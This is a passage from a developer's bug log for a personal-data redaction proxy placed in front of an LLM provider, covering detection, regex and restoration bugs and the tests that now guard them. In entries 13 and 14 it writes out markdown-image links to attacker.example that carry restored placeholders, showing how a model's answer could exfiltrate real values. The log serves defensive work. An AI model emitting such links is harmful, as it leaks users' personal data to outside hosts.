# Bug log

Real bugs found during development, logged the moment they happen. Format:
symptom, root cause, fix, the test that now guards it.

The author's interview notes (private) only tell stories that are recorded
here — nothing is added to them until it happened and was logged here
first. Where an entry mentions a **scratchpad** or **session scratchpad**,
it means a working folder outside the repository used while the work was
done; its scripts and logs are not published.

---

## 1. Per-cluster NFKC disagreed with real NFKC for Hangul (2026-09-28, Phase 1a)

**Symptom:** Before writing the tests, a scratch probe compared `normalise(s).text`
against whole-string NFKC on 900,000 random strings from fast-check. Six
disagreed, and the same six were not idempotent (normalising the output
again changed it). All six contained Hangul compatibility jamo (U+3131–U+318E,
half-width U+FFA0–U+FFDC, or circled forms like U+3260).

**Root cause:** `normalise()` applies NFKC one grapheme cluster at a time, so
that each output character has a known source range for the offset map. The
first version's comment claimed that "NFKC never composes across a cluster
boundary in practice". That was false. Compatibility jamo such as ㄱ (U+3131)
and ㅏ (U+314F) are _separate_ grapheme clusters, but NFKC first turns them
into conjoining jamo (U+1100, U+1161) and then composes those into one
syllable, 가 (U+AC00). Normalised apart, they stayed as two conjoining jamo.
Normalised together, they became one syllable. So the per-cluster output was
not NFKC, and a second pass changed it.

**Fix:** When a new cluster arrives, compare `NFKC(group + cluster)` with
`NFKC(group) + NFKC(cluster)`. If they differ, merge the cluster into the
current group (so both map to one combined source range). This keeps every cut
at a boundary where NFKC is provably stable, and the output now equals
whole-string NFKC. Clusters starting with an ASCII character skip the check,
since nothing composes with a following ASCII character. After the fix, 0
disagreements in 1.2 million samples (300,000 of them Hangul-heavy).

**Guarded by** (`test/unit/detection/normalise.test.ts`):

- property "equals whole-string NFKC of the visible text…" (the oracle test,
  3,000 runs over binary, grapheme and a Hangul/combining-heavy alphabet)
- property "is idempotent"
- example "composes Hangul compatibility jamo that sit in separate clusters"

Mutation check: disabling the merge makes all three fail.

**Lesson:** a comment saying "never … in practice" is a claim, and claims
need a test. The whole-string oracle is trivially correct, so comparing
against it is cheap and catches this whole class of mistake.

---

## 2. Typo in the Verhoeff permutation table (2026-09-28, Phase 1a)

**Symptom:** The property test "detects every swap of two different adjacent
digits" failed after 41 runs on one run and passed on the previous one (fresh
random seed each time). The report gave only a seed and a path; the
counterexample is hidden on purpose (ADR-009).

**Root cause:** Row 4 of the permutation table `P` in
`src/detection/verhoeff.ts`, typed from memory, was
`[9,4,5,3,1,2,7,6,8,0]`. The correct row is `[9,4,5,3,1,2,6,8,7,0]`.
Entries 6–8 were scrambled. Diagnosed without printing any number: row _k_ of
`P` must equal row 1 applied _k_ times, and only row 4 failed that. An
exhaustive check of all 8 positions × 90 digit pairs found exactly 12 swaps the
broken table could not detect.

Why nothing else caught it:

- **All three published Rosetta Code vectors passed.** None of 236, 12345 or
  123456789012 has a 6, 7 or 8 at a position ≡ 4 (mod 8).
- **The "single-digit error" and "exactly one valid check digit" properties
  passed.** A scrambled row is still a permutation, and any permutation
  preserves single-error detection.
- **The Aadhaar generator's test passed.** The generator and the validator
  share `verhoeffCheckDigit`, so they agreed with each other while both being
  wrong.

Impact had it shipped: real Aadhaar numbers with a 6, 7 or 8 at the affected
position would have failed validation and been treated as unvalidated. That is
roughly 3 in 10 of them.

**Fix:** Corrected row 4 and added the comment "Row i is row 1 applied i
times", so the table can be checked by hand.

**Guarded by** (`test/unit/detection/verhoeff.test.ts`):

- property "detects every swap of two different adjacent digits" (random)
- "detects every adjacent swap, exhaustively: all 8 positions x 90 digit
  pairs", which is deterministic and doesn't depend on a lucky seed. Mutation
  check: putting the typo back makes it fail with exactly the 12 missed swaps.
- Added 2026-09-28 after review: "agrees with a reference derived from first
  principles". The swap tests check a _property_, and a different wrong table
  could still have it. This compares against a reference whose D5 is computed
  from the pentagon-symmetry definition and whose P is computed from
  Wikipedia's published cycle (1 5 8 9 4 2 7 0)(3 6), with no typed table. It
  covers all 111,110 payloads of 1–5 digits exhaustively, plus 5,000 random
  payloads of 6–30 digits for rows 6 and 7. Mutation checks: the row-4 typo
  fails both, and a swap in row 7 fails the random one.

**Lesson:** published vectors test a handful of inputs, and a table typo can
dodge all of them. A property that encodes the algorithm's _mathematical
guarantee_ (Verhoeff catches every adjacent transposition) tests the whole
table. It also shows why generators must not be the only check on
validators: they can share a bug and still agree.

---

## 3. The email pattern refused addresses it should have caught (2026-09-28, Phase 1b)

**Symptom:** While writing the email tests, two cases I had listed as
"negatives" turned out to be leaks. `x .priya@example.com` (a stray dot in
front) found nothing, and neither did `priya@example.com--thanks` (a hyphen
straight after the address). In both, the whole address would have gone to
the provider.

**Root cause:** Both came from lookarounds that were stricter than needed.

- The lookbehind `(?<!LOCAL_CHAR|\.)` stops a match from starting inside a
  local part. That is the ReDoS guard: without it, a long token with no `@`
  is rescanned from every position. It also refused to start after _any_ dot,
  including a stray one with nothing before it.
- The lookahead `(?![\p{L}\p{N}\p{M}_-])` after the top-level domain refused
  any hyphen or digit after the address, instead of only stopping a top-level
  domain from being cut off mid-word.

**Fix:** The lookbehind is now `(?<!LOCAL_CHAR\.?)`: it blocks only a dot that
follows a local-part character, which is all the ReDoS guard needs. The
lookahead is now `(?![\p{L}\p{M}])`. For a privacy tool, stopping early
redacts too little and matching more redacts too much, so the looser side is
the safe one.

Loosening the lookahead exposed a second, smaller bug straight away: the
test for `user@example.xn--p1ai` (a punycode top-level domain) failed, finding
only `user@example.xn`. The top-level domain alternation tried plain letters
before punycode, and the hyphen no longer stopped it. The fix was to try the
punycode branch first.

**Guarded by** (`test/unit/detection/email.test.ts`): "stops at the right
place with a stray dot before it / a hyphen after it / a digit after it", and
"finds user@example.xn--p1ai". ReDoS mutation check: removing the lookbehind
makes a 50,000-character token take 26.8 s instead of milliseconds, and the
"linear time" tests fail.

**Lesson:** in a redaction tool, every "does not match" test deserves a
second look: is it a false positive being avoided, or a leak being allowed?

---

## 4. A test passed for the wrong reason, and a real-looking Aadhaar sat in a comment (2026-09-28, Phase 1b)

**Symptom (a):** The Aadhaar test "ignores a list of small numbers that happens
to add up to 12 digits" (`Scores: 12 34 56 78 90 12`) passed. But it was
meant to prove the layout rule: part of a run must be grouped 4-4-4. It
didn't test that. The whole run is exactly 12 digits, and whole runs are
always candidates. It was rejected only because it starts with 1.

**Fix (a):** The test now splits a generated _valid_ Aadhaar into two-digit
pairs inside a longer run (`11 NN NN NN NN NN NN 11`). Without the layout
rule that Aadhaar would be found. Mutation check: accepting any grouping makes
it fail, along with two others.

**Symptom (b):** A probe of hand-written examples showed that a 4-4-4
number I had typed into a source comment in `src/detection/digit-runs.ts` as
an illustration passes Verhoeff with a first digit of 2. (Deliberately not
repeated here: writing this entry, I first quoted it, and the file scan below
caught that too.) It is a valid-looking Aadhaar that could belong to someone.
ADR-009 keeps such values out of files.

**Fix (b):** Replaced it with `2345 6789 0123`, which fails Verhoeff. Every
hand-written Aadhaar-shaped number in the tests now fails Verhoeff or starts
with 0/1, and the test file says so. A test asserts the one it uses directly
(`isVerhoeffValid('234567890123') === false`). A scan of every file for Aadhaar-shaped numbers
that pass the Aadhaar checks now finds only one: the first 12 digits of a
published Mastercard test card, which a test uses on purpose.

**Guarded by:** `test/unit/repo-hygiene.test.ts` now runs that scan on every
test run over `src/`, `test/`, `scripts/` and the README. It fails on any
Aadhaar-shaped number that passes the Aadhaar checks, or any valid card
number that is not a published test card, and reports only file and line.
Mutation check: removing its published-card exception makes it flag the
Mastercard test card's line.

**Lesson:** a passing test proves the code does _something_. To check it
proves the _right_ thing, break the rule it claims to test and watch it fail.
And "made-up" numbers are not safe by default: with a 1-in-10 checksum, one
in ten made-up numbers is a valid one.

---

## 5. An exhaustive test started timing out when the suite grew (2026-09-28, Phase 1b)

**Symptom:** After the detection tests were added, `npm test` failed every
time: Phase 1a's "matches the reference for every payload of 1 to 5 digits
(111,110 payloads)" in `verhoeff.test.ts` hit Vitest's 5-second default
timeout (5.2 s; 7.3 s under coverage). Nothing in Verhoeff had changed.

**Root cause:** The test takes 0.7 s on its own. Vitest runs test files in
parallel, and the new detection suites (5,000-sample false-positive rates and
2,000-run properties) compete for the same CPUs, so its wall-clock time grew
about 7×.

**Fix:** That one test has an explicit 60-second timeout, with a comment
giving the measured times. The default stays at 5 s everywhere else, so a
genuinely hanging test still fails fast.

**Guarded by:** the full suite itself (`npm test`, `npm run test:coverage`).

**Lesson:** timeouts measure the machine, not just the code. A heavy
deterministic test should declare its own budget.

---

## 6. Two fail-open gaps: a length cap and partial redaction (2026-09-28, Phase 1b review)

**Symptom:** Review asked whether anything too long or too odd could pass
through unredacted. Probes (values generated in memory; only counts and
offsets printed) found two gaps.

- `priya@<64 or more letters>.example` was **not detected at all**.
- Of 9,000 16-digit numbers that fail Luhn, each hiding a valid Indian mobile
  and with no keyword, **980 (about 11%) were partly redacted**: a 4-4-4 part
  was taken as an Aadhaar and the remaining group was left visible. Separately,
  libphonenumber returns only `202-555-0143` from `+1 202-555-0143 7`.

**Root cause:** Both were decisions that looked reasonable locally.

- The email domain label was capped at 63 characters "as DNS requires". But
  an address with a longer label still names a person, and the cap turned
  "not a valid address" into "not redacted".
- Each detector reports the span it recognises. Nothing made sure a match
  inside a longer number took the rest of that number with it. I had even
  documented the Aadhaar case as intended behaviour.

**Fix:** Removed the label cap (a new test proves a 50,000-character label is
still linear). `detect()` now widens each resolved detection to the whole
digit runs it overlaps (`widenToRuns` in `digit-runs.ts`), then resolves
overlaps again. ADR-010 amendment "fail closed".

**Guarded by:**

- `email.test.ts`, "long input fails closed": 300-character address,
  50,000-character local part, 64- and 50,000-character labels, a
  5,000-character top-level domain, an address after 100,000 characters,
  each redacted whole in under 1 s. Mutation check: putting the cap back
  fails the two label tests.
- `detect.test.ts`, "fails closed inside longer numbers": the 6,000-case
  sweep asserts 0 partial redactions and more than 100 whole ones (so it is
  not vacuous); plus the libphonenumber piece case and a "does not widen
  across a comma or a word" case. `digit-runs.test.ts` covers
  `widenToRuns` directly. Mutation check: disabling widening fails 6 tests.

**Lesson:** for a privacy tool, every limit and every "match a piece" is a
question: what happens to the rest? The answer must be "redacted", never
"passed through".

---

## 7. Comma-separated phone numbers were not redacted at all (2026-09-28, found while preparing Phase 2)

**Symptom:** While measuring the widening open item (ADR-010, "Open issue"),
two valid Indian mobiles written as `Call <a>, <b> today.` produced **no
detections**. Over 300 generated pairs per separator, both numbers were left
unredacted in 300/300 texts for `, ` `,` `,` `x` `#` `#`. UK drama-range
numbers leaked in about 90% of texts with the same separators and about 10%
with `; ` `ext` `,, `. Values were generated in memory; only counts and
offsets were printed.

**Root cause:** libphonenumber reads `,` `;` `#` `x` and `ext` after a number
as the start of an extension. It returns one match that covers the first
number, the separator and as many digits of the second number as an
extension may hold, so the match ends inside the second number. `phone.ts`
then applies its "not glued to a digit" check to that span and drops it. The
POSSIBLE pass returns the same span and drops it the same way, so nothing
claims either number. The check was meant to stop us cutting into a longer
token, but dropping a library match is fail-open: the digits it covered are
still personal data.

**Fix:** Two changes in `phone.ts`, one for each half of the cause.

- libphonenumber gets a copy of the text with every extension marker
  replaced by newlines of the same length (`hideExtensionMarkers`), so
  offsets are unchanged and a newline ends a number. The markers are
  libphonenumber's own list (`createExtensionPattern.js`): `,` `;` `#` `~`,
  and the standalone words `x`, `int`, `ext`, `xt`, `extn`, `extension`,
  `доб`, `anexo`. Extensions are no longer recognised; they are not personal
  data, and the number in front of them is still found.
- A library match glued to a digit is no longer dropped. Masking alone was
  not enough: a fuzz over random separators still found libphonenumber
  stopping inside a run for `<a>(<b>`. Such a match is kept, and `detect()`
  widens it to the whole digit runs it touches (fail closed). Glued to a
  letter, mark, `_` or `@` it is still dropped, as before.

On a 20,000-text fuzz of two numbers joined by 1–3 random separator pieces,
texts with an unredacted number fell from 5,230 to 2,153. Everything that
still leaked there already leaked before this fix and is a different cause
(bug-log 8). `detect()` speed is unchanged (100 KB of comma-heavy text:
477 ms before, 264 ms after).

**Guarded by:** `phone.test.ts`, "lists of numbers (bug-log 7)": for 19
separators (`, ` `,` `,` `,, ` `; ` `;` `#` `~` `x` `X` `ext` `Ext.`
`extn` `extension` `int` `доб` `anexo` and spaced variants), 100
generated Indian pairs must each give exactly two PHONE detections at the
exact offsets, and 50 UK drama-range pairs after "call" must both be
covered; 200 `<a>(<b>` texts must have both numbers covered; a number with
an extension is still found; `hideExtensionMarkers` keeps every offset and
leaves words such as `Text`, `next`, `mixture`, `xt6` and `3x` alone.
Mutation checks: searching the unmasked text fails 37 tests; dropping
digit-glued matches again fails the `<a>(<b>` test.

**Lesson:** a library's match is a claim about where a value is, not a
yes/no answer. When its span doesn't fit our boundary rules, the safe
response is to widen it, never to discard it.

---

## 8. Two numbers glued by `-`, `[`, `]`, `)` or `+` are not redacted (2026-09-28, found while fixing bug 7)

**Symptom:** After the bug-7 fix, a fuzz of two generated Indian mobiles
joined by random separators still left numbers unredacted. Measured per
separator (`Numbers <a><sep><b> ok`, 200 pairs each): with `-`, `--`, `[`,
`]` or `)`, **both** numbers were unredacted in 200/200; with `+`, one of
the two was unredacted in 187/200. `.`, space, `(`, `/`, `:`, `*`, `|`, `=`,
`'`, en dash, `- ` and ` -` were fine (0/200). These leaks predate bug 7:
the same fuzz at the previous commit leaked them too.

**Root cause (partly understood):** Phone detection relies entirely on how
libphonenumber cuts the text into candidates. `<a>-<b>` is one run of 20
digits: libphonenumber takes it as one candidate, too long to be a number,
and no other detector claims 20 digits (card stops at 19). For the brackets
libphonenumber also seems to read both numbers as one invalid candidate.
With `+`, the second number is read as international (`+91…`), which moves
its country code and makes it invalid. Glued by `_`, both numbers are also
missed, but that is by design (ADR-010: `_` joins a token).

**Fix (2026-09-28):** Not a phone-specific fallback but a general safety
net, as the user decided (ADR-011): after every detector has run, any
stretch of 9 or more digits that no detection claimed is redacted as a
generic `NUMBER` (`src/detection/number.ts`). Digits count across `.`,
hyphens and dashes, brackets and `+`, but not spaces; what the digits are
glued to does not matter, so `<a>_<b>` is caught too. N and the joiners were
chosen from measurements on dates, amounts, order IDs, versions, IPs and
hashes (ADR-011).

**Guarded by:** `number.test.ts`:

- "redacts every digit of two mobiles glued by …": 200 generated pairs for
  each of `-` `--` `[` `]` `)` `(` `+` `_` `.` en dash `/` `:`, 0 unredacted;
- "redacts bare 9- to 18-digit numbers": 500 generated, 0 unredacted;
- unit tests of `unclaimedNumbers` (the 9-digit threshold, each joiner,
  separators that must not join, glue, claimed spans that split a run, a
  claim that covers several runs);
- "what the safety net does not catch": 16 date, time, amount, version and
  reference formats give no detection at all, including `2024-09-28`,
  `2024-09-28 14:30` and `Rs 1,25,000`;
- "the accepted cost": 7 non-personal formats that are caught, so a change
  in either direction is noticed;
- linear time, with and without claims.

Six mutation checks, all caught (testing guide). Tests that asserted "no
detection" for long numbers now assert a `NUMBER` detection: they checked
that a detector did not claim the value, which is still true, and would
otherwise have been asserting a leak.

---

## 9. Timing tests failed on a busy machine (2026-09-28, found while fixing bugs 7 and 8)

**Symptom:** One coverage run after the bug-7 fix failed two tests: a
property test hit Vitest's 5 s default timeout, and an email linear-time
check took 1.5 s against its 1 s limit. The next run passed, and `detect()`
had not slowed down. Later, with the bug-8 tests added (more CPU-heavy tests
running in parallel), 3 of 5 full runs failed the same way: property tests
timing out at 5 s, and "scans a long token with no @ in linear time".

**Root cause:** Two kinds of wall-clock assumption.

- The linear-time tests asserted absolute limits ("under 1 s"). Test files
  run in parallel, and the machine's load varied (one suite run took 6.9 s,
  the next 23.6 s), so a healthy run could exceed the limit.
- The first replacement, time on a doubled input divided by time on the
  original with a limit of 3, was still too close to noise. Normalisation
  allocates arrays proportional to the input, so garbage collection alone
  moved its ratio between about 2.0 and 2.8. Timing inputs that ran in about
  1 ms made it worse (the NUMBER test failed under coverage).
- The property tests had Vitest's default 5 s timeout, which is a
  wall-clock limit too.

**Fix:** `test/support/linear-time.ts`, `growthRatio`: time the work on an
input and on one 4 times longer, alternating the two sizes, and take the
fastest of 5 runs of each; assert the ratio is below 8 (linear code gives
about 4, quadratic about 16). Inputs are sized so the small one takes
several milliseconds. No test asserts wall-clock time any more.
`vitest.config.ts` sets `testTimeout: 30_000`, since a timeout only guards
against a hang.

**Guarded by:** 8 consecutive full runs green, 4 of them under coverage
(19.8–31.4 s each on a busy machine). Mutation check: removing the email
ReDoS guard still fails 5 linear-time tests, on the ratio itself (15–26),
not on a timeout.

**Lesson:** a performance test should compare the code with itself, not
with the clock. Load changes the clock; it rarely changes a ratio by 2×.

---

_Entries 10–13 were found during Phase 2 (2026-09-29) but written up at the
end of the phase, not at the moment each was found. Rule 9 asks for the
latter; noted here so the log's timing claims stay true._

## 10. Redaction tests could print a generated value on failure (2026-09-29, Phase 2)

**Symptom:** The first `redact.test.ts` compared output with plain
`expect(redacted).toBe('My Aadhaar is [AADHAAR_1].')`, with the input built
from `aadhaar(rng)`, `pan(rng)` and `indianMobile(rng)`. Every test passed,
so nothing was printed. But if redaction ever broke, Vitest's failure diff
would print the _received_ string, which is the input with the generated
value still in it. ADR-009 forbids exactly that. Found by checking the new
tests against the testing guide's ground rules before committing, not by a
failure.

**Root cause:** Phase 1 tests never had this problem, because `detect()`
returns offsets, not text: comparing detections can never print a value.
`redactMessage()` and `restore()` return text, and when they are wrong, that
text contains the value. The existing safe pattern (compare structure) did
not carry over, and I did not notice at first.

**Fix:** `test/support/quiet-text.ts`, `assertTextEqualQuietly(actual,
expected)`: on a mismatch it throws only the first differing index and both
lengths. Every comparison that embeds a generated value uses it. Placeholder
syntax, PAN literals and the published Visa number are still compared
directly.

**Guarded by:** `test/unit/support/quiet-text.test.ts` plants
`234567890123` in a mismatching string and asserts that the message contains
neither string. Nothing checks automatically that future tests use the helper;
that is a review rule in the testing guide.

**Lesson:** "safe to compare" was a property of `detect()`'s return type,
not of the tests. A new function with a new return type needs a fresh look
at what its failure message would print.

---

## 11. The literal index grammar accepted strings Pseudonym never produces (2026-09-29, Phase 2 review)

**Symptom:** Review asked what happens to `[CARD 4111111111111111]`. The
LITERAL pattern accepted any number of index digits (`[0-9]+`), so the whole
bracket, including a real, validated card number, was treated as a
user-typed literal: `See [LITERAL_1] please.` The card was still not sent,
because the whole bracket was replaced. But it was classified as a literal, not a card,
and `[PAN_01]` or `[PAN_99999]` were literals too. My own test ("a literal
bracket wins over a real detection it contains") asserted that output as
correct, and the ADR described it as intended.

**Root cause:** The LITERAL namespace exists to catch text that could be
confused with a placeholder Pseudonym emits (ADR-002). `formatPlaceholder`
only ever emits indices 1–9999 with no leading zero, but the recognising
pattern was written independently and was looser. Two definitions of the
same grammar disagreed, which is exactly what ADR-002's "one grammar" rule is
meant to prevent.

**Fix:** `PLACEHOLDER_INDEX_PATTERN = '[1-9][0-9]{0,3}'` in `placeholder.ts`,
next to `MAX_PLACEHOLDER_INDEX`, used by every pattern in `variants.ts`. Now
`[CARD 4111111111111111]` is not literal-shaped. detect() claims the 16
digits as a card on their own (`See [CARD [CARD_1]] please.`), and leading
zeros and 5+ digits are never placeholder-shaped anywhere. The wrong test was
replaced. A side effect, measured: no detector can now overlap a
literal at all (0 of 139,986 tag × separator × index combinations).

**Guarded by:** `redact.test.ts`, "an index over 4 digits is not
literal-shaped" (also asserts the card digits are absent) and "does not
treat a leading-zero index as a literal"; `variants.test.ts`, the
`[PAN_0]`/`[PAN_01]`/`[PAN_10000]` negatives. Mutation check: loosening the
index back to `[0-9]+` fails 6 tests.

**Lesson:** a test written from the same misunderstanding as the code will
agree with it. The question that found this came from outside ("what
happens with this input?"), not from the tests.

---

## 12. An unsafe region ran past an HTML attribute's closing quote (2026-09-29, Phase 2)

**Symptom:** While checking my `unsafe-regions.test.ts` expectations in a
scratch probe, `<a href="https://example.com/x">` gave three overlapping
regions, and the bare-URL ones included the closing `"`. Merged, the region
was one character too wide. In `href="https://x.example/a"[PAN_1]` it would also have
covered a placeholder written straight after the quote, leaving it
unrestored.

**Root cause:** The bare-URL patterns stop at whitespace, `<`, `>` and
parentheses, but not at quotes, so inside a quoted attribute they ran on to
the next excluded character. Separately, four independent patterns reported
the same URL several times.

**Fix:** Quotes are excluded from both bare-URL patterns, and
`unsafeRegions` merges overlapping regions into one sorted, non-overlapping
list.

**Guarded by:** `unsafe-regions.test.ts`, "finds a double-quoted href" and
"finds a single-quoted src" (exact region text). Mutation check: allowing
quotes again fails both.

**Lesson:** this one erred on the safe side (too much text marked unsafe),
which is why it was cheap. Bug 13 is the same module going wrong in the
other direction.

---

## 13. A markdown image with parentheses in its URL bypassed restoration safety (2026-09-29, Phase 2 end-of-phase review)

**Symptom:** Writing down `unsafe-regions.ts`'s known limits in plain words,
I probed each one with `restore()` instead of trusting the comment. The
comment called "a markdown target containing `)`" rare and harmless. It
was neither: `![x](https://attacker.example/?q=(1)[AADHAAR_1])` was
**restored**. CommonMark allows balanced parentheses inside a link
destination, so a client rendering that answer would fetch
`https://attacker.example/?q=(1)<real Aadhaar>`. This is the exfiltration path Pseudonym
says it mitigates. It never reached a commit.

**Root cause:** The markdown pattern took the destination up to the first
`)`. The bare-URL pattern did not cover the rest either, because it stops at `(`. So
everything after the first `)` fell outside every region.

**Fix:** A destination now runs from `](` (optionally followed by whitespace)
to the first whitespace, or is the whole `<…>` form, which CommonMark lets
contain spaces. Unbracketed destinations cannot contain spaces, so this covers
any depth of balanced parentheses. It also covers the closing `)` and
anything glued after it, the safe side. Ordinary text after the space that
follows a link is still restored (tested).

**Guarded by:** `restore.test.ts`, "does not restore after balanced
parentheses inside an image destination"; `unsafe-regions.test.ts`, one and
two levels of parentheses, a space after `(`, the `<…>` form with a space,
and "does not reach past the whitespace after a link". Mutation check: going
back to "stop at the first `)`" fails 5 tests, including the `restore()` one.

**Lesson:** a "known limit" is a claim like any other. Each one gets a probe
against the real attack before it goes into the threat model. This one
turned out to be a leak.

---

## 14. A reference-style image definition in angle brackets bypassed restoration safety (2026-09-29, Phase 2 review of bug 13)

**Symptom:** Review asked whether the bug-13 fix ("a destination runs to
the first whitespace") broke angle-bracket destinations, which CommonMark
lets contain spaces, and listed related forms to try against `restore()`.
The inline form `![x](<https://attacker.example/?d= [AADHAAR_1]>)` was
already safe (the bug-13 fix treats `<…>` as one destination up to its
`>`). But the **reference-style** form was restored:

```
![x][ref]

[ref]: <https://attacker.example/?d= [AADHAAR_1]>
```

A renderer resolves `![x][ref]` to that destination and fetches it with the
real value in the query string. It never reached a commit.

**Root cause:** `unsafe-regions.ts` only knew the inline destination form,
anchored on `](`. A reference definition has no `](`. The only pattern left
to cover it was the bare-URL one, which stops at whitespace, so everything
after the space in `<…>` was outside every region. The unbracketed
reference form (`[ref]: https://…?d=[AADHAAR_1]`) was safe only by accident,
because the bare-URL pattern happened to cover it.

**Fix:** One destination grammar, `<[^>\n]*>` or a run of non-whitespace,
applied after `](` (inline) and after `[label]:` (reference definitions).
The reference pattern is not anchored to the start of a line, so it also
covers definitions inside block quotes and list items, and a destination on
the line after the label. The cost: the token after any `[…]:` in prose is
left unrestored. The label itself is never marked, so `[AADHAAR_1]: …` in
prose still restores (tested).

**Guarded by:** `restore.test.ts`, "does not restore in an image
destination": inline `<…>` with a space; reference definition with and
without angle brackets, on the next line, and inside a block quote; a line
break after `(`; `<img src>` with a space inside the quotes. Plus "still
restores a placeholder written as a reference label in prose". Mutation
checks: dropping the reference pattern fails 3 tests, dropping its `<…>`
form fails 3, and dropping the inline `<…>` form fails 2.

**Lesson:** bug 13's fix handled the syntax in front of me, not the grammar
behind it. A destination can appear in two places in CommonMark, and the
probe list for a security fix has to come from the specification, not from
the one example that failed.

---

## 15. `tools: null` was rejected as an unknown field (2026-09-29, Phase 3)

**Symptom:** the Phase 3 test "treats null settings as absent" sent
`tools: null` (with `stream`, `stop`, `user` and `temperature` also null,
as OpenAI clients often send unset settings) and got a 400 "unknown field
in request" instead of a 200. It never reached a commit.

**Root cause:** request validation runs in two passes (`schema.ts`). The
first, `unsupportedFeature`, rejects fields OpenAI has and Pseudonym
deliberately does not support (`tools`, `metadata`...) unless their value
is `null`, which the design treats as "unset". The second, the strict Zod
schema, does not name those fields at all, so it rejected the very `null`
the first pass had just let through. Two passes, two opinions on the same
field.

**Fix:** after the first pass, unsupported fields whose value is `null` are
removed before the strict schema sees the body. The strict schema stays the
single place that decides what is allowed; nothing is added to it.

**Guarded by:** `chat-completions.test.ts`, "treats null settings as
absent" (`tools: null` next to other null settings → 200, and the
outgoing body has none of them); `schema.test.ts`, "a null unsupported
field counts as unset", one case per field in `UNSUPPORTED_FIELDS`.

**Lesson:** when validation is split into a friendly-message pass and a
strict pass, every rule the first pass relaxes has to be relaxed in the
second too. The test that caught it was written for client compatibility,
not for this bug.

---

## 16. `unsafeRegions` takes quadratic time on some model answers (2026-09-29, found designing Phase 4)

**Symptom:** while working out how streaming restoration could track unsafe
regions, a scratch probe timed `unsafeRegions()` on an input and on one four
times as long (the `growthRatio` method from `test/support/linear-time.ts`).
Ordinary text scaled linearly (ratio 4.4), and so did a run of unclosed
`="` (4.5). Two shapes did not: `](< ` repeated gave a ratio of 17.1, and
`[a ` repeated 16.2, which is quadratic. 20,000 repeats (about 80 KB) took
about 0.9 s and 1.0 s. The model writes the text `restore()` scans, and the
response size is not capped, so a prompt-injected answer can block the event
loop for seconds. It is in committed Phase 2 code; nothing was ever sent
unredacted because of it.

**Root cause:** two patterns scan to the end of the line from every place
they could start, and fail. `MARKDOWN_TARGET` tries `<[^>\n]*>` after each
`](` and reads to the end of the line looking for `>` before it falls back.
`REFERENCE_DEFINITION` reads the label `(?:[^\]\\\n]|\\.)+` from each `[` to
the end of the line looking for `]:`. With k such starts on one line, that
is about k × line length steps. No linear-time test covered
`unsafeRegions` or `restore`, so nothing caught it.

A third shape turned up during the Phase 4a mutation checks (B16, which
points the new linear-time tests at a copy of the Phase 2 expressions): a
run of host labels with no `/`, `a-b.c` repeated. `BARE_HOST_URL` tries
every word boundary as the start of a host and reads the whole run before
failing on the missing `/`. Growth ratio 16.3; 20 KB took 0.5 s, and the
test's 400 KB input would have taken minutes, so B16 was stopped after 12
minutes with 2 tests already failed.

**Fix:** Phase 4a (ADR-018): a left-to-right scanner,
`UnsafeRegionScanner`, replaces the regular expressions. It keeps a small
fixed state and does a fixed amount of work per character. It was needed
for streaming anyway.

**Guarded by:** `unsafe-regions.test.ts`, "linear time (bug-log 16)":
`growthRatio` on `](< `, `[a `, unclosed `="` and `='`, URLs with
placeholders, host label chains and prose, all repeated. Growth ratios
at n = 2,000 (Phase 2 expressions → scanner at n = 20,000): `](< ` 14.9 →
4.8, `[a ` 16.8 → 4.2, host chain 16.3 → 4.0; the linear shapes stay about
4 in both. Pointing the tests at the Phase 2 expressions (mutation B16)
fails them.

**Lesson:** a regular expression that can fail after reading to the end of
the line is quadratic as soon as the text holds many places it could start.
Anything that scans model output needs a linear-time test, like the
detectors already had.

---

## 17. `restore()` compares every bare match with every bracketed one (2026-09-29, Phase 4a)

**Symptom:** after bug 16, a probe timed `restore()` itself the same way.
Prose scaled linearly (ratio 3.9); `[CARD_1] CARD_1 ` repeated gave 16.1:
2,500 repeats took 12.6 ms, 10,000 took 203 ms. Quadratic, and again in
text the model writes. In committed Phase 2 code; nothing leaked because
of it.

**Root cause:** `restore()` drops a bare match that sits inside a bracketed
one (`CARD_1` inside `[CARD_1]`) with
`bareMatches.filter((c) => !overlapsAny(bracketMatches, c.start, c.end))`,
and `overlapsAny` walks the whole bracket list for every bare match. Both
lists are already in text order, so one pass over the two is enough.

**Fix:** one pass over the two sorted lists (`candidates()` in
`restore.ts`): for each bare match, skip brackets that end before it, then
check the next one.

**Guarded by:** `restore.test.ts`, "linear time (bug-log 17)": brackets
and bare forms mixed, placeholders in URLs, prose. Bringing back the old
filter (mutation B17) fails it. The streaming restorer has its own
linear-time tests in `stream-restore.test.ts`.

**Lesson:** the same as bug 16, one level up: the first linear-time test
on `restore()` found a second quadratic step.

---

## 18. The stream restorer sent text twice (2026-09-29, Phase 4a)

**Symptom:** the first run of the new property "streaming gives the same
answer as `restore()` on the whole text" failed after a few hundred cases,
on the shrunk counterexample `0Aadhaar` streamed as `0Aa` + `dhaar`. The
stream produced `0AaAadhaar`: the `Aa` went out twice. It never reached a
commit.

**Root cause:** to decide how much to hold back, `undecidedFrom` searches
the end of the text for anything that could still become a placeholder. It
puts the last two code units already sent in front of the new text, so
that the "not glued to a letter" check can see what came before. But
the search could also _start_ inside those two units. `Aa` on its own
looks like the start of `Aadhaar_1`, because the `0` that glues it to the
left was no longer in view. The match started 2 units before the new text,
so the function returned -2, and the restorer released text from before
its own starting point.

**Fix:** the search starts at the new text (a global regular expression
with `lastIndex` set past the context); the context is only ever looked
at, never matched.

**Guarded by:** `stream-restore.test.ts`, "a word glued to the text before
a chunk is not held again" (this exact case), and the streaming
property, which found it.

**Lesson:** "this can't happen by construction" held for the state I
reasoned about (text already released was never a possible start), not
for the _window_ I actually searched, which had lost the context that
made the start impossible. The property test found it in under a second.

---

## 19. A linear-time test ran into the 30 s hang guard once the suite grew (2026-09-29, Phase 4b)

**Symptom:** the first full `vitest run --coverage` after the Phase 4b
tests were added failed one Phase 4a test, `unsafe-regions.test.ts`,
"linear time > a URL with a placeholder, repeated", at 37.1 s against the
30 s `testTimeout`. Every Phase 4b test passed. Run alone (its folder under
coverage) it passed. The next full coverage run passed it at 29.1 s, 0.9 s
from failing. Nothing was ever sent unredacted; it was a test that could
fail at random.

**Root cause:** the linear-time tests sized their input by repeats,
`unit.repeat(20_000)`, whatever the unit's length. The short units
(`](< `, `[a `, `a=" `, `a-b.c`) gave 60 to 100 KB, but
`https://a.example/[AADHAAR_1] ` is 30 characters, so that test scanned
600 KB and 2.4 MB, five times each plus a warm-up, under v8's coverage
instrumentation: 23.2 s on its own. The same held in `restore.test.ts`,
where "placeholders in URLs" (27 characters × 5,000) took 19.7 s. Phase 4b
